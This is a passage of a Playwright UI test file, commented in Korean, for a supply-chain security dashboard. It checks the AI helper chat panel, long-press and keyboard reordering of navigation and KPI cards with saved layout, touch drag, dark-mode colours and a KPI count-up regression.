      return [getComputedStyle(kids).display, getComputedStyle(kids).gridTemplateRows, getComputedStyle(grp).visibility, getComputedStyle(grp).transitionDelay];
    });
    expect(m[0]).toBe('grid');
    expect(m[1]).toBe('0px');
    expect(m[2]).toBe('hidden');
    expect(m[3]).toBe('0s');
  });
});

// ── F AI 도우미 채팅 ──
test.describe('F AI 도우미 채팅 화면', () => {
  async function openChat(page: Page) {
    await page.goto('/');
    await expect(page.locator('[data-part="assistant-fab"]')).toHaveAttribute('data-ready', 'true');
    await page.locator('[data-part="assistant-fab"]').click();
    await page.locator('[data-part="assistant"]').getByRole('tab', { name: 'AI 도우미' }).click();
    await expect(page.locator('[data-part="chat"]')).toBeVisible();
  }
  test('머리줄 40 · 선 두 개 X · 한 턴 한 줄 띠(번갈아 바탕) · 한 줄 입력 + 말줄임 · 30×30 보내기 · 새 줄만 6px 등장', async ({ page, backend }) => {
    backend.info.chat = true;
    await openChat(page);
    const P = '[data-part="assistant"]';
    const head = await page.locator(`${P} > header`).evaluate((h) => {
      const t = h.querySelector('.assist-title') as HTMLElement;
      const x = h.querySelector('button[aria-label="닫기"]') as HTMLElement;
      const lines = [...x.querySelectorAll('.x-line')].map((l) => [getComputedStyle(l).height, getComputedStyle(l).transform]);
      return { h: h.getBoundingClientRect().height, title: [getComputedStyle(t).color, getComputedStyle(t).textOverflow, t.textContent], btn: [x.getBoundingClientRect().width, x.getBoundingClientRect().height, x.textContent, x.querySelector('svg') !== null], lines, right: h.getBoundingClientRect().right - x.getBoundingClientRect().right };
    });
    expect(head.h).toBe(40);
    expect(head.title[0]).toBe(await rgbOf(page, '--text-2'));
    expect(head.title[1]).toBe('ellipsis');
    expect(head.title[2]).toContain('도우미');
    expect(head.btn).toEqual([40, 40, '', false]);
    const deg = (m: string) => { const v = m.match(/matrix\(([^)]+)\)/)![1].split(',').map(Number); return Math.round((Math.atan2(v[1], v[0]) * 180) / Math.PI); };
    expect(head.lines.map((l) => l[0])).toEqual(['2px', '2px']);
    expect(head.lines.map((l) => deg(l[1])).sort((a, b) => a - b)).toEqual([45, 135]);
    expect(head.right).toBeLessThanOrEqual(4);

    // 입력칸 · 보내기
    const inp = page.getByRole('textbox', { name: '질문' });
    const im = await inp.evaluate((e) => { const cs = getComputedStyle(e); return { tag: e.tagName, r: cs.borderRadius, bw: cs.borderTopWidth, bg: cs.backgroundColor, to: cs.textOverflow, h: e.getBoundingClientRect().height }; });
    expect(im).toMatchObject({ tag: 'INPUT', r: '7px', bw: '1px', to: 'ellipsis' });
    expect(im.bg).toBe(await rgbOf(page, '--surface-2', 'bg'));
    const send = page.locator(`${P} button[aria-label="보내기"]`);
    expect(await send.evaluate((s) => [s.getBoundingClientRect().width, s.getBoundingClientRect().height, (s as HTMLButtonElement).disabled, Number(getComputedStyle(s).opacity)])).toEqual([30, 30, true, 0.4]);
    await inp.fill('판정 대기 요약해 줘');
    await expect(send).toBeEnabled();

    await inp.press('Enter');
    const rows = page.locator('[data-part="chat"] [data-part="chat-msg"]');
    await expect(rows).toHaveCount(2);
    await expect(rows.last()).toContainText('판정 대기 건이');
    // 새 줄만 등장 애니메이션(chat-in 0.18s — 11/09 SPEC --dur-base)
    const anims = await rows.evaluateAll((els) => els.map((e) => [e.classList.contains('is-new'), getComputedStyle(e).animationName, getComputedStyle(e).animationDuration]));
    expect(anims).toEqual([[true, 'chat-in', '0.18s'], [true, 'chat-in', '0.18s']]);
    await inp.fill('두 번째');
    await inp.press('Enter');
    await expect(rows).toHaveCount(4);
    const rm = await rows.evaluateAll((els) => els.map((e) => { const cs = getComputedStyle(e); const p = (e.parentElement as HTMLElement).getBoundingClientRect(); return [e.getAttribute('data-role'), Math.abs(e.getBoundingClientRect().width - p.width) < 2, cs.backgroundColor, parseFloat(cs.paddingTop), parseFloat(cs.paddingLeft), getComputedStyle(e.querySelector('[data-part="chat-bubble"]')!).backgroundColor]; }));
    expect(rm.map((r) => r[0])).toEqual(['user', 'assistant', 'user', 'assistant']);
    const [s2, s1] = [await rgbOf(page, '--surface-2', 'bg'), await rgbOf(page, '--surface', 'bg')];
    for (const r of rm) {
      expect(r[1]).toBe(true);
      expect(r[2]).toBe(r[0] === 'user' ? s2 : s1);
      expect(r[3]).toBe(11);
      expect(r[4]).toBe(12);
      expect(r[5]).toBe('rgba(0, 0, 0, 0)'); // 말풍선 없음
    }
    // 예전 줄은 다시 움직이지 않는다(새로 붙은 두 줄만 is-new)
    expect(await rows.evaluateAll((els) => els.map((e) => e.classList.contains('is-new')))).toEqual([false, false, true, true]);
    // 대화 칸만 스크롤, 입력칸은 패널 안 고정
    expect(await page.locator('[data-part="chat-list"]').evaluate((e) => getComputedStyle(e).overflowY)).toBe('auto');
    await page.screenshot({ path: `${SCRATCH}/r1-chat.png` });
    // 닫기
    await page.locator(`${P} button[aria-label="닫기"]`).click();
    await expect(page.locator(P)).toBeHidden();
  });

  test('답 기다리는 중: 30×30 칸이 「멈추기」(React 기존 기능 유지) · 끝나면 보내기', async ({ page, backend }) => {
    backend.info.chat = true;
    await page.addInitScript(() => {
      const orig = window.fetch.bind(window);
      window.fetch = (input: RequestInfo | URL, init?: RequestInit) => {
        const url = typeof input === 'string' ? input : input instanceof URL ? input.href : input.url;
        if (!url.includes('/api/chat')) return orig(input, init);
        return new Promise((_, rej) => init?.signal?.addEventListener('abort', () => rej(new DOMException('aborted', 'AbortError'))));
      };
    });
    await openChat(page);
    await page.getByRole('textbox', { name: '질문' }).fill('질문');
    await page.getByRole('textbox', { name: '질문' }).press('Enter');
    const stop = page.locator('[data-part="assistant"] button[aria-label="멈추기"]');
    await expect(stop).toBeVisible();
    expect(await stop.evaluate((s) => [s.getBoundingClientRect().width, s.getBoundingClientRect().height])).toEqual([30, 30]);
    await expect(page.locator('[data-part="assistant"] button[aria-label="보내기"]')).toHaveCount(0);
    await stop.click();
    await expect(page.locator('[data-part="chat-stopped"]')).toBeVisible();
  });

  test('reduced-motion: 새 줄 등장 애니메이션 없음', async ({ page, backend }) => {
    backend.info.chat = true;
    await page.emulateMedia({ reducedMotion: 'reduce' });
    await openChat(page);
    await page.getByRole('textbox', { name: '질문' }).fill('판정 대기 요약해 줘');
    await page.getByRole('textbox', { name: '질문' }).press('Enter');
    await expect(page.locator('[data-part="chat"] [data-part="chat-msg"]')).toHaveCount(2);
    const d = await page.locator('[data-part="chat"] [data-part="chat-msg"]').first().evaluate((e) => getComputedStyle(e).animationName);
    expect(d).toBe('none');
  });
});

// ── G 길게 눌러 옮기기 ──
const NAV = 'nav[aria-label="화면"]';
const groupLinks = (page: Page, g: string) => page.locator(`${NAV} [data-nav-group="${g}"] a`);
const layout = (page: Page) => page.evaluate(() => localStorage.getItem('supplyguard.layout'));
async function longPressDrag(page: Page, from: string, to: string, opts: { below?: boolean; esc?: boolean; holdMs?: number; xFrac?: number } = {}) {
  const a = (await page.locator(from).boundingBox())!;
  const b = (await page.locator(to).boundingBox())!;
  await page.mouse.move(a.x + a.width / 2, a.y + a.height / 2);
  await page.mouse.down();
  await page.waitForTimeout(opts.holdMs ?? 520);
  const tx = b.x + b.width * (opts.xFrac ?? 0.5);
  const ty = opts.below === false ? b.y + 4 : b.y + b.height - 4;
  await page.mouse.move(tx, ty, { steps: 10 });
  if (opts.esc) await page.keyboard.press('Escape');
  await page.mouse.up();
}

test.describe('G 길게 눌러 옮기기', () => {
  test('사이드바: 0.4초 누르면 집힘 → 같은 묶음 안에서 자리 바꿈 · 저장 · 새로고침 유지 · 이동 없음 · 대시보드 고정', async ({ page, backend }) => {
    void backend;
    await scansApi(page);
    await page.goto('/');
    await expect(page.getByTestId('pending')).toBeVisible();
    await expect(page.locator(`${NAV} a[href="/"]`)).not.toHaveAttribute('data-sort-scope', /.+/);
    await expect(groupLinks(page, '설치 검사')).toHaveText(['설치 검사', '공급망 검사', '평가']);
    // 짧게 누르면 그냥 이동
    await groupLinks(page, '설치 검사').nth(1).click();
    await expect(page).toHaveURL(/\/scans$/);
    await page.goto('/');
    await expect(page.getByTestId('pending')).toBeVisible();
    // 집힘 표시(떠오름 · 자리 점선)
    const first = groupLinks(page, '설치 검사').first();
    const box = (await first.boundingBox())!;
    await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
    await page.mouse.down();
    await page.waitForTimeout(520);
    await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2 + 2);
    await expect(first).toHaveClass(/sg-sort-picked/);
    await expect(page.locator(`${NAV} .sg-sort-marker`)).toHaveCount(1);
    await page.screenshot({ path: `${SCRATCH}/r1-sort-picked.png` });
    await page.mouse.move(box.x + box.width / 2, box.y + box.height * 2.8, { steps: 10 });
    await page.mouse.up();
    await expect(groupLinks(page, '설치 검사')).toHaveText(['공급망 검사', '평가', '설치 검사']);
    await expect(page).toHaveURL(/\/$/); // 집은 뒤 떼면 이동 없음
    await expect(page.locator(`${NAV} .sg-sort-marker`)).toHaveCount(0);
    expect(JSON.parse((await layout(page))!)).toEqual({ v: 1, sidebar: { install: ['scans', 'evaluation', 'installs'] } });
    await expect(page.locator('#sg-sort-live')).toHaveText('설치 검사를 3번째로 옮김');
    await page.reload();
    await expect(groupLinks(page, '설치 검사')).toHaveText(['공급망 검사', '평가', '설치 검사']);
    // 다른 묶음은 그대로
    await expect(groupLinks(page, '런타임 감시')).toHaveText(['이벤트', '토폴로지']);
  });

  test('0.4초 안에 8px 넘게 움직이면 취소 · 집은 뒤 Esc 는 원래 자리 · 키보드 Alt+↑/↓ · aria-live', async ({ page, backend }) => {
    void backend;
    await page.goto('/');
    await expect(page.getByTestId('pending')).toBeVisible();
    const g = '설치 검사';
    // 8px 넘게 움직이면(0.4초 전) 집히지 않는다
    const a = (await groupLinks(page, g).first().boundingBox())!;
    await page.mouse.move(a.x + 20, a.y + a.height / 2);
    await page.mouse.down();
    await page.mouse.move(a.x + 40, a.y + a.height / 2, { steps: 3 });
    await page.waitForTimeout(500);
    await expect(groupLinks(page, g).first()).not.toHaveClass(/sg-sort-picked/);
    await page.mouse.up();
    await page.goto('/');
    await expect(page.getByTestId('pending')).toBeVisible();
    // Esc
    await longPressDrag(page, `${NAV} [data-nav-group="${g}"] a >> nth=0`, `${NAV} [data-nav-group="${g}"] a >> nth=2`, { esc: true });
    await expect(groupLinks(page, g)).toHaveText(['설치 검사', '공급망 검사', '평가']);
    await expect(page.locator('#sg-sort-live')).toHaveText('순서 바꾸기를 취소함');
    await expect(page).toHaveURL(/\/$/);
    expect(await layout(page)).toBeNull();
    // 키보드
    await groupLinks(page, g).first().focus();
    await page.keyboard.press('Alt+ArrowDown');
    await expect(groupLinks(page, g)).toHaveText(['공급망 검사', '설치 검사', '평가']);
    await expect(groupLinks(page, g).nth(1)).toBeFocused();
    await expect(page.locator('#sg-sort-live')).toHaveText('설치 검사를 2번째로 옮김');
    await page.keyboard.press('Alt+ArrowDown');
    await page.keyboard.press('Alt+ArrowDown');
    await expect(page.locator('#sg-sort-live')).toHaveText('설치 검사는 이미 맨 끝입니다');
    expect(JSON.parse((await layout(page))!).sidebar.install).toEqual(['scans', 'evaluation', 'installs']);
    await expect(groupLinks(page, g).first()).toHaveAttribute('aria-describedby', /sg-sort-help/);
  });

  test('저장 값 검사: 깨진 JSON · v 다름 → 기본 순서, 모르는 id 버림 · 새 항목은 기본 순서의 앞 항목 뒤', async ({ page, backend }) => {
    void backend;
    await page.addInitScript(() => {
      if (!sessionStorage.getItem('r1-once')) {
        sessionStorage.setItem('r1-once', '1');
        localStorage.setItem('supplyguard.layout', '{broken');
      }
    });
    await page.goto('/');
    await expect(groupLinks(page, '설치 검사')).toHaveText(['설치 검사', '공급망 검사', '평가']);
    await page.evaluate(() => localStorage.setItem('supplyguard.layout', JSON.stringify({ v: 2, sidebar: { install: ['evaluation', 'scans', 'installs'] } })));
    await page.reload();
    await expect(groupLinks(page, '설치 검사')).toHaveText(['설치 검사', '공급망 검사', '평가']);
    await page.evaluate(() => localStorage.setItem('supplyguard.layout', JSON.stringify({ v: 1, sidebar: { install: ['zzz', 'evaluation', 'installs', 7, 'evaluation'], records: 'x' } })));
    await page.reload();
    await expect(groupLinks(page, '설치 검사')).toHaveText(['평가', '설치 검사', '공급망 검사']);
    await expect(groupLinks(page, '설정 · 기록')).toHaveText(['정책', '차단 목록', '변경 이력', '감사 로그', '설정']); // 11/09 정책 하위 메뉴
  });

  // 11/09 저녁: 지표 6칸 → 위 3칸(같은 저장 키 evaluationKpi) — 옮기기 동작은 그대로
  test('평가 위 3칸: Alt+←/→ · 길게 눌러 끌기(그리드) · 저장 evaluationKpi · 칸은 tabindex 0', async ({ page, backend }) => {
    void backend;
    await evalApi(page);
    await page.goto('/evaluation');
    await expect(page.locator('[data-part="evaluation"][data-state="ready"]')).toBeVisible();
    const ids = () => page.locator('[data-part="eval-top"] [data-kpi]').evaluateAll((e) => e.map((x) => (x as HTMLElement).dataset.kpi));
    const DEF = ['static-detection', 'static-fpr', 'runtime-detection'];
    expect(await ids()).toEqual(DEF);
    await expect(page.locator('[data-kpi="static-detection"]')).toHaveAttribute('tabindex', '0');
    await page.locator('[data-kpi="static-detection"]').focus();
    await page.keyboard.press('Alt+ArrowRight');
    expect(await ids()).toEqual(['static-fpr', 'static-detection', ...DEF.slice(2)]);
    await expect(page.locator('#sg-sort-live')).toHaveText('정적 악성 탐지율을 2번째로 옮김');
    // Alt+→ 뒤 미끄러짐(FLIP)이 끝난 자리에서 잰다 — 3칸은 폭이 넓어 움직이는 중에 재면 왼쪽 절반을 벗어난다
    await expect.poll(() => page.locator('[data-part="eval-top"] [data-kpi]').evaluateAll((els) => els.every((e) => getComputedStyle(e).transform === 'none'))).toBe(true);
    await longPressDrag(page, '[data-kpi="runtime-detection"]', '[data-kpi="static-fpr"]', { below: false, xFrac: 0.2 }); // 같은 줄 왼쪽 절반 = 그 칸 앞
    await expect.poll(ids).toEqual(['runtime-detection', 'static-fpr', 'static-detection']);
    expect(JSON.parse((await layout(page))!).evaluationKpi).toEqual(['runtime-detection', 'static-fpr', 'static-detection']);
    await page.reload();
    await expect(page.locator('[data-part="evaluation"][data-state="ready"]')).toBeVisible();
    expect((await ids())[0]).toBe('runtime-detection');
  });

  test('설정 머리 오른쪽 「화면 배치 기본 순서로」: 즉시 · 토스트 · 사이드바 바로 기본 순서 · 조회자도', async ({ page, backend }) => {
    backend.auth.asViewer();
    await page.addInitScript(() => {
      if (!sessionStorage.getItem('r1-once')) {
        sessionStorage.setItem('r1-once', '1');
        localStorage.setItem('supplyguard.layout', JSON.stringify({ v: 1, sidebar: { install: ['evaluation', 'scans', 'installs'] }, evaluationKpi: ['latency'] }));
      }
    });
    await page.goto('/settings');
    await expect(groupLinks(page, '설치 검사')).toHaveText(['평가', '공급망 검사', '설치 검사']);
    const btn = page.getByTestId('page-actions').locator('[data-action="layout-reset"]');
    await expect(btn).toHaveText('화면 배치 기본 순서로');
    // 머리 오른쪽
    const [bb, hb] = await Promise.all([btn.boundingBox(), page.getByTestId('page-actions').boundingBox()]);
    expect(hb!.x + hb!.width - (bb!.x + bb!.width)).toBeLessThan(4);
    await btn.click();
    await expect(groupLinks(page, '설치 검사')).toHaveText(['설치 검사', '공급망 검사', '평가']);
    await expect(page.getByText('화면 배치를 기본 순서로 되돌렸습니다', { exact: false })).toBeVisible();
    expect(await layout(page)).toBeNull();
  });

  test.describe('터치 · 390 서랍', () => {
    test.use({ viewport: { width: 390, height: 844 }, hasTouch: true, isMobile: true });
    test('길게 눌러(터치) 옮기면 서랍은 열린 채 · 짧은 탭은 이동 + 서랍 닫힘', async ({ page, backend }) => {
      void backend;
      await page.goto('/');
      await expect(page.getByTestId('pending')).toBeVisible();
      await page.getByRole('button', { name: '메뉴' }).click();
      await expect(page.locator('aside[data-part="sidebar"]')).toBeVisible();
      const a = (await groupLinks(page, '런타임 감시').first().boundingBox())!;
      const b = (await groupLinks(page, '런타임 감시').nth(1).boundingBox())!;
      const cdp = await page.context().newCDPSession(page);
      const pt = (x: number, y: number) => [{ x, y, id: 1 }];
      await cdp.send('Input.dispatchTouchEvent', { type: 'touchStart', touchPoints: pt(a.x + 30, a.y + a.height / 2) });
      await page.waitForTimeout(550);
      for (let i = 1; i <= 8; i++) await cdp.send('Input.dispatchTouchEvent', { type: 'touchMove', touchPoints: pt(a.x + 30, a.y + a.height / 2 + ((b.y + b.height - 4 - (a.y + a.height / 2)) * i) / 8) });
      await cdp.send('Input.dispatchTouchEvent', { type: 'touchEnd', touchPoints: [] });
      await expect(groupLinks(page, '런타임 감시')).toHaveText(['토폴로지', '이벤트']);
      await expect(page.locator('aside[data-part="sidebar"]')).toBeVisible();
      await expect(page).toHaveURL(/\/$/);
      await groupLinks(page, '런타임 감시').first().tap();
      await expect(page).toHaveURL(/\/topology$/);
      await expect(page.locator('aside[data-part="sidebar"]')).toBeHidden();
    });
  });
});

// ── H 다크 ──
test.describe('H 다크 모드', () => {
  test('코드 창 바탕 · 창 점 · 채팅 띠 · 트리 선택이 다크 토큰 값', async ({ page, backend }) => {
    backend.info.chat = true;
    await scansApi(page);
    await page.addInitScript(() => localStorage.setItem('supplyguard.theme', 'dark'));
    await page.goto('/scans?id=scan-0901');
    const sel = `[data-sheet="scan"] [data-part="code"] ${CW}`;
    await expect(page.locator(sel)).toBeVisible();
    expect(await tok(page, '--code-bg')).toBe('#0A0C11');
    expect(await tok(page, '--win-close')).toBe('#B8746E');
    expect(await tok(page, '--line-soft')).toBe('#38444D'); // 11/09 밤 남색 선
    expect((await codeWinOf(page, sel)).bodyBg).toBe('rgb(10, 12, 17)');
    expect(await page.locator(`${sel} .cw-dot`).first().evaluate((e) => getComputedStyle(e).backgroundColor)).toBe('rgb(184, 116, 110)');
    await page.screenshot({ path: `${SCRATCH}/r1-dark.png` });
  });
});

// 11/06 CI(PR #6)에서 카운트업 중간값이 시작값(1234)보다 작게(1221) 읽혔다 — 첫 rAF 시각이 효과의 performance.now() 보다
// 앞서면 진행률이 음수가 되어 숫자가 한 프레임 거꾸로 갔다. 프레임 시각을 20ms 앞당겨 그 순간을 매번 만든다
test.describe('C KPI 카운트업 — 첫 프레임 시각이 시작보다 앞서도 거꾸로 가지 않는다(11/06)', () => {
  test('1,000 → 2,000 사이 보인 값은 모두 1,000 이상 2,000 이하, 끝은 2,000', async ({ page, backend }) => {
    void backend;
    await page.goto('/');
    await expect(page.getByTestId('pending')).toBeVisible();
    const base = { k: 'violations', label: '위반', icon: '⚠', stripe: 'danger', tone: 'danger', sub: '', box: { w: 260, h: 140 } };
    await stage(page, 'kpi', { ...base, value: 1000 });
    const val = page.locator(`${STAGE} [data-kpi="violations"] [data-value]`);
    await expect(val).toHaveText('1,000');
    await page.evaluate(() => {
      const w = window as unknown as { __seen: number[] };
      w.__seen = [];
      const el = document.querySelector('[data-r1-stage] [data-kpi="violations"] [data-value]')!;
      new MutationObserver(() => w.__seen.push(Number(el.textContent!.replace(/,/g, '')))).observe(el, { childList: true, subtree: true, characterData: true });
      const raf = window.requestAnimationFrame.bind(window);
      window.requestAnimationFrame = (cb) => raf((t) => cb(t - 20));
    });
    await restage(page, { ...base, value: 2000 });
    await expect(val).toHaveText('2,000');
    const seen = await page.evaluate(() => (window as unknown as { __seen: number[] }).__seen);
    expect(seen.length).toBeGreaterThan(1);
    expect(Math.min(...seen), `보인 값 ${seen.join(',')}`).toBeGreaterThanOrEqual(1000);
    expect(Math.max(...seen)).toBeLessThanOrEqual(2000);
  });
});
